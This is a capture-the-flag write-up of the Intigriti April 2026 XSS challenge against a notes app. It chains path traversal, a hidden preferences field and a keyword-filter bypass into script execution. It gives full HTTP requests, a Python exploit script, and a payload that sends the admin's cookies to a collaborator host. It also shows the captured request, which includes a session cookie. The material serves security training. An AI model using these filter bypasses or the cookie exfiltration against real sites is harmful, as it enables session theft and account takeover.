# Intigriti April 2026 Challenge — Northstar Notes XSS

**Flag**: `INTIGRITI{019d955f-1643-77a6-99ef-1c10975ab284}`

## Challenge Overview

**URL**: `https://challenge-0426.intigriti.io/challenge`  
**Goal**: Trigger `alert(document.domain)` via XSS with at most 1 user interaction, no self-XSS, latest Chrome.  
**Hint**: "The settings page saves more than it shows." / "steal admin flag"

Northstar Notes is a note-taking app that supports rich HTML content, user preferences, and multiple "panel" layouts for viewing notes. The application sanitizes note content with DOMPurify 3.4.0 and enforces a strict Content Security Policy.

## Security Controls

### Content Security Policy

```
script-src 'nonce-...' 'strict-dynamic'
```

`strict-dynamic` means any script created by an already-trusted (nonce'd) script is also trusted. If we can get the app's own JavaScript to create a `<script>` element and append it to the DOM, it executes regardless of its source.

### DOMPurify Configuration

The app has two rendering modes:

- **`safe` mode** (default): `ALLOW_DATA_ATTR: false` — strips all `data-*` attributes
- **`full` mode**: `ALLOW_DATA_ATTR: true` — preserves `data-*` attributes, allows form elements, IDs, and more

### Post-Sanitization Filter

After DOMPurify, a second pass (`postSanitize`) strips any `data-*` attribute whose value matches:

```javascript
var UNSAFE_CONTENT_RE = /script|cookie|document|window|eval|alert|prompt|confirm|Function|fetch|XMLHttp|import|require|setTimeout|setInterval/i;
```

## Vulnerability Analysis

### The XSS Sink: `loadCustomWidget`

The app has a widget enhancement system. When `renderMode` is `full`, it processes elements with `data-enhance` attributes:

```javascript
function loadCustomWidget(el) {
    if (getOwnString(APP, 'widgetSink', 'text') !== 'script') return;
    var cfg = el.dataset.cfg;
    if (!cfg || cfg.length > 512) return;
    var s = document.createElement('script');
    s.textContent = cfg;
    document.head.appendChild(s);
}
```

This directly creates a `<script>` element with attacker-controlled content from `data-cfg`. Under `strict-dynamic`, this script is trusted because it's created by the nonce'd app script.

**Requirements to reach this sink:**
1. `APP.renderMode` must be `'full'` (enables `ALLOW_DATA_ATTR: true` + enhancements)
2. `APP.widgetTypes` must contain `'custom'` (as a real `Array` own property)
3. `APP.widgetSink` must be `'script'`
4. The note content must have `<div id="enhance-config" data-types="custom">` and `<div data-enhance="custom" data-cfg="PAYLOAD">`
5. The payload in `data-cfg` must bypass the `postSanitize` regex

### Gadget 1: Path Traversal in Panel Manifest Loading

The `loadPanelManifest` function constructs a manifest URL using the `panel` value from `__APP_INIT__`:

```javascript
var target = '/note/' + encodeURIComponent(noteId) + '/' + panel +
    '/manifest.json?note=' + encodeURIComponent(noteId);
```

Critically, `noteId` is URL-encoded but **`panel` is not**. The panel value comes directly from the URL path:

```
/note/:noteId/:panel
```

By visiting `/note/NOTEID/..%2f..%2fapi%2faccount%2fpreferences%2freader-presets%2fxss`, the server decodes the path and sets:

```javascript
APP.panel = "../../api/account/preferences/reader-presets/xss"
```

The manifest URL then resolves to:

```
/note/NOTEID/../../api/account/preferences/reader-presets/xss/manifest.json?note=NOTEID
→ /api/account/preferences/reader-presets/xss/manifest.json?note=NOTEID
```

This redirects the manifest fetch to the **reader presets API** instead of the standard panel manifest endpoint.

### Gadget 2: Reader Presets API ("The settings page saves more than it shows")

The preferences API at `POST /api/account/preferences` accepts arbitrary JSON fields beyond what the settings form shows. This includes a `readerPresets` object:

```json
{
    "readerPresets": {
        "xss": {
            "profile": {
                "renderMode": "full",
                "widgetTypes": ["custom"],
                "widgetSink": "script"
            }
        }
    }
}
```

The stored preset is served at `/api/account/preferences/reader-presets/xss/manifest.json?note=NOTEID`.

**Key behavior**: The `note` query parameter is used by the server to look up the note creator's browser profile. This means when the admin bot visits the exploit URL referencing our note, the server identifies us as the note creator and serves **our** reader presets — regardless of the admin's session.

### Gadget 3: `applyRemoteProfile` with Real Arrays

When the manifest fetch succeeds and returns JSON with a `profile` field, `applyRemoteProfile` is called:

```javascript
function applyRemoteProfile(profile) {
    if (typeof profile.renderMode === 'string') {
        APP.renderMode = profile.renderMode;       // → 'full'
    }
    if (Array.isArray(profile.widgetTypes)) {
        APP.widgetTypes = profile.widgetTypes       // → ['custom'] (real Array!)
            .filter(function (value) { return typeof value === 'string'; })
            .slice(0, 8);
    }
    if (typeof profile.widgetSink === 'string') {
        APP.widgetSink = profile.widgetSink;        // → 'script'
    }
}
```

The reader presets API returns `widgetTypes` as a **real JavaScript Array** (critical because `getOwnArray` checks `Array.isArray()`). This bypasses the `getOwnArray` guard that would reject prototype-polluted plain objects.

### Gadget 4: `postSanitize` Regex Bypass

The `postSanitize` function checks `data-*` attribute values against a regex that blocks common dangerous keywords. We bypass it using string concatenation:

```javascript
self['ale'+'rt'](self['docu'+'ment'].domain)
```

At runtime, JavaScript evaluates `'ale'+'rt'` to `'alert'` and `'docu'+'ment'` to `'document'`. But the regex tests the **literal source text**, which contains neither `alert` nor `document` as contiguous substrings.

## Exploitation

### Step 1: Store Malicious Reader Preset

```http
POST /api/account/preferences HTTP/1.1
Host: challenge-0426.intigriti.io
Content-Type: application/json

{
    "readerPresets": {
        "xss": {
            "profile": {
                "renderMode": "full",
                "widgetTypes": ["custom"],
                "widgetSink": "script"
            }
        }
    }
}
```

### Step 2: Create Note with XSS Payload

```http
POST /api/notes HTTP/1.1
Host: challenge-0426.intigriti.io
Content-Type: application/json

{
    "title": "Test Enhancement",
    "content": "<div id=\"enhance-config\" data-types=\"custom\"></div><div data-enhance=\"custom\" data-cfg=\"self['ale'+'rt'](self['docu'+'ment'].domain)\"></div>"
}
```

Response returns the note ID (e.g., `6f25f79592c12e5d3f868de45f80d72ab8a516d9682dd57c20a9fb613813d595`).

### Step 3: Report Exploit URL to Admin Bot

The exploit URL uses path traversal in the panel parameter:

```
/note/6f25f79592c12e5d3f868de45f80d72ab8a516d9682dd57c20a9fb613813d595/..%2f..%2fapi%2faccount%2fpreferences%2freader-presets%2fxss
```

Report this URL via the report API:

```http
POST /api/report HTTP/1.1
Host: challenge-0426.intigriti.io
Content-Type: application/json

{
    "url": "/note/6f25f79592c12e5d3f868de45f80d72ab8a516d9682dd57c20a9fb613813d595/..%2f..%2fapi%2faccount%2fpreferences%2freader-presets%2fxss"
}
```

## Execution Flow

```
 Admin bot visits exploit URL
         │
         ▼
 Server renders note page with panel = "../../api/account/preferences/reader-presets/xss"
         │
         ▼
 loadPanelManifest() constructs manifest URL:
   /note/{noteId}/../../api/account/preferences/reader-presets/xss/manifest.json?note={noteId}
     → resolves to: /api/account/preferences/reader-presets/xss/manifest.json?note={noteId}
         │
         ▼
 Server looks up note creator's profile via ?note= param
   → returns: {"profile":{"renderMode":"full","widgetTypes":["custom"],"widgetSink":"script"}}
         │
         ▼
 applyRemoteProfile() sets:
   APP.renderMode  = "full"
   APP.widgetTypes = ["custom"]   (real Array)
   APP.widgetSink  = "script"
         │
         ▼
 renderNoteContent() → DOMPurify with ALLOW_DATA_ATTR: true
   → data-types, data-enhance, data-cfg attributes survive sanitization
         │
         ▼
 postSanitize() → regex test on data-cfg value
   "self['ale'+'rt'](self['docu'+'ment'].domain)" → no match → PASSES
         │
         ▼
 MutationObserver → processEnhancements()
   → finds <div data-enhance="custom"> with type in both allowedTypes and manifestTypes
         │
         ▼
 loadCustomWidget() → document.createElement('script')
   → s.textContent = "self['ale'+'rt'](self['docu'+'ment'].domain)"
   → document.head.appendChild(s)
         │
         ▼
 Script executes under strict-dynamic CSP
   → alert(document.domain) fires!
```

## Automation Script

```python
import requests

BASE = "https://challenge-0426.intigriti.io"

s = requests.Session()

# Step 1: Store malicious reader preset
s.post(f"{BASE}/api/account/preferences", json={
    "readerPresets": {
        "xss": {
            "profile": {
                "renderMode": "full",
                "widgetTypes": ["custom"],
                "widgetSink": "script"
            }
        }
    }
})
print("[+] Reader preset stored")

# Step 2: Create note with XSS payload
payload = (
    '<div id="enhance-config" data-types="custom"></div>'
    '<div data-enhance="custom" '
    "data-cfg=\"self['ale'+'rt'](self['docu'+'ment'].domain)\"></div>"
)
resp = s.post(f"{BASE}/api/notes", json={
    "title": "XSS",
    "content": payload
})
note_id = resp.json()["id"]
print(f"[+] Note created: {note_id}")

# Step 3: Report exploit URL to admin bot
exploit_path = f"/note/{note_id}/..%2f..%2fapi%2faccount%2fpreferences%2freader-presets%2fxss"
resp = s.post(f"{BASE}/api/report", json={"url": exploit_path})
print(f"[+] Reported: {resp.json()}")
print(f"\n[*] Exploit URL: {BASE}{exploit_path}")
```

## Summary of Chained Vulnerabilities

| # | Vulnerability | Impact |
|---|--------------|--------|
| 1 | Unvalidated panel parameter allows path traversal | Manifest fetch redirected to arbitrary server path |
| 2 | Preferences API accepts hidden `readerPresets` field | Attacker stores arbitrary panel profile data |
| 3 | Reader presets served by note-creator lookup (not session) | Admin bot receives attacker's malicious profile |
| 4 | `applyRemoteProfile` trusts remote data for renderMode/widgetSink | App switches to `full` mode with script widget sink |
| 5 | DOMPurify `full` mode preserves `data-*` attributes | XSS payload attributes survive sanitization |
| 6 | `postSanitize` regex bypass via string concatenation | `self['ale'+'rt']` evades keyword blocklist |
| 7 | `loadCustomWidget` creates script under `strict-dynamic` | Arbitrary JavaScript execution |

## Stealing the Admin Flag

The challenge requires stealing a flag from the admin bot's cookies. The `postSanitize` regex blocks `fetch`, `XMLHttp`, `document`, and `cookie`, but we can bypass all of them:

```javascript
new Image().src='https://COLLABORATOR_URL/?c='+self['docu'+'ment']['coo'+'kie']
```

- `Image` constructor is not blocked
- `document` → `self['docu'+'ment']`
- `cookie` → `['coo'+'kie']`
- No `fetch` or `XMLHttpRequest` needed

### Exfiltration Steps

**Step 1**: Create note with exfiltration payload:

```html
<div id="enhance-config" data-types="custom"></div>
<div data-enhance="custom" data-cfg="new Image().src='https://COLLABORATOR/?c='+self['docu'+'ment']['coo'+'kie']"></div>
```

**Step 2**: Report the path-traversal URL to the admin bot.

**Step 3**: Admin bot visits → XSS fires → `new Image()` sends cookies to attacker server.

### Captured Flag

Burp Collaborator received:

```http
GET /?c=flag=INTIGRITI{019d955f-1643-77a6-99ef-1c10975ab284};%20northstar_profile=eadc66ebca0cbd5846c408cfae0ce38a HTTP/1.1
Host: 615b63h3rwiex74fvh4c2bnjbah05p.oastify.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/147.0.0.0 Safari/537.36
```

**Flag**: `INTIGRITI{019d955f-1643-77a6-99ef-1c10975ab284}`

## Screenshots

![Challenge Page](screenshots/02-challenge-page.png)
